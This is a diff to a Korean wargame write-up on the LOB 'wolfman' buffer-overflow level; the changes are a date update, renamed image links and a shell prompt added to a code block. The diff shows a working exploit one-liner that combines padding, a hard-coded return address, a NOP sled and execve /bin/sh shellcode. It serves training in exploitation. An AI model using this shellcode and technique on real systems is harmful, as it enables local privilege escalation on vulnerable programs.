@@ -5,7 +5,7 @@ author: eli_ez3r
 key: 20180005
 category: write-up
 date: 2018-08-29 00:00:00 +0900
-modify_date: 2019-11-13
+modify_date: 2024-04-26
 article_header:
   type: cover
   image:
@@ -72,7 +72,7 @@ orc문제와 똑같아 보이지만 마지막에 buffer hunter라고 해서 buff
 
 
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/image-20180829012518015.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/01.png" width="600px">{:.rounded.shadow}
 
 ------
 
@@ -86,22 +86,22 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 
 쉘코드가 넣을 주소를 알기 위해 core를 떨구자.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/image-20180829011701272.png" width="800px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/02.png" width="800px">{:.rounded.shadow}
 
 "S"부분이 쉘코드 24byte가 들어갈 자리이다.
 
 
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/image-20180829011803090.png" width="600px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/03.png" width="600px">{:.rounded.shadow}
 
 0xbffffa64부분 언저리주소를 RET에 넣으면 NOP슬라이드를 타고 Shellcode가 실행된다.
 
 
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/image-20180829012158062.png" width="800px">
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/05.wolfman/04.png" width="800px">{:.rounded.shadow}
 
-```
-./wolfman `python -c 'print "A"*44+"\x64\xfa\xff\xbf"+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+```shell
+[orc@localhost orc]$ ./wolfman `python -c 'print "A"*44+"\x64\xfa\xff\xbf"+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
 ```
 
 -----
